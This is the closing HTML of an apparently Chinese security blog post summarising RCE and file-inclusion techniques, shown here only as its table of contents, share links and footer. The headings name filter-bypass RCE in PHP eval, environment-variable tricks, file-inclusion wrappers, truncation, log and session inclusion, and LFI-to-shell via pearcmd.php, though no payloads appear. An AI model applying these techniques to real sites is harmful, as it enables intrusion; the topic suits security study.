href="#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%86%B2%E7%A0%B4%E9%99%90%E5%88%B6"><span class="toc-number">5.8.</span> <span class="toc-text">eval中无数字字母RCE(冲破限制)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-5-%E5%92%8C-PHP-7-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.8.1.</span> <span class="toc-text">PHP 5 和 PHP 7 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-shell%E6%89%93%E7%A0%B4%E9%99%90%E5%88%B6"><span class="toc-number">5.8.2.</span> <span class="toc-text">PHP5+shell打破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glob%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">5.8.3.</span> <span class="toc-text">深入理解glob通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc%E6%89%A7%E8%A1%8Crce"><span class="toc-number">5.8.4.</span> <span class="toc-text">构造poc执行rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E6%89%A9%E5%B1%95"><span class="toc-number">5.9.</span> <span class="toc-text">eval中无数字字母RCE(扩展)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8linux%E7%9A%84-%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">5.9.0.1.</span> <span class="toc-text">利用linux的$(())构造数字</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">5.10.</span> <span class="toc-text">环境变量绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%88%87%E5%89%B2%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">5.10.1.</span> <span class="toc-text">$PATH环境变量切割构造字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWD%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%88%87%E5%89%B2%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">5.10.2.</span> <span class="toc-text">$PWD环境变量切割构造字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">5.10.3.</span> <span class="toc-text">自定义环境变量绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%A7%BF%E5%8A%BF"><span class="toc-number">6.</span> <span class="toc-text">文件包含姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.</span> <span class="toc-text">无限制本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.1.</span> <span class="toc-text">data伪协议文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.2.</span> <span class="toc-text">filter协议文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.3.</span> <span class="toc-text">input协议文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.4.</span> <span class="toc-text">获取敏感文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.</span> <span class="toc-text">有限制本地文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.1.</span> <span class="toc-text">%00截断文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.2.</span> <span class="toc-text">路径长度截断文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.3.</span> <span class="toc-text">点号截断文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-once-%E7%BB%95%E8%BF%87%E4%B8%8D%E8%83%BD%E9%87%8D%E5%A4%8D%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">6.2.4.</span> <span class="toc-text">require_once 绕过不能重复包含文件的限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.3.</span> <span class="toc-text">日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.3.1.</span> <span class="toc-text">中间件日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.3.2.</span> <span class="toc-text">SSH日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.4.</span> <span class="toc-text">session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">6.4.1.</span> <span class="toc-text">Session的工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="toc-number">6.4.2.</span> <span class="toc-text">如何创建session文件呢。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.4.3.</span> <span class="toc-text">攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.5.</span> <span class="toc-text">无限制远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.6.</span> <span class="toc-text">有限制远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%97%AE%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.1.</span> <span class="toc-text">通过问号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BA%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.2.</span> <span class="toc-text">通过井号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.3.</span> <span class="toc-text">通过空格绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pearcmd-php%E4%BB%8ELFI%E5%88%B0getshell"><span class="toc-number">6.7.</span> <span class="toc-text">利用pearcmd.php从LFI到getshell</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&text=对于RCE和文件包含的一点总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&is_video=false&description=对于RCE和文件包含的一点总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=对于RCE和文件包含的一点总结&body=Check out this article: https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&name=对于RCE和文件包含的一点总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&t=对于RCE和文件包含的一点总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
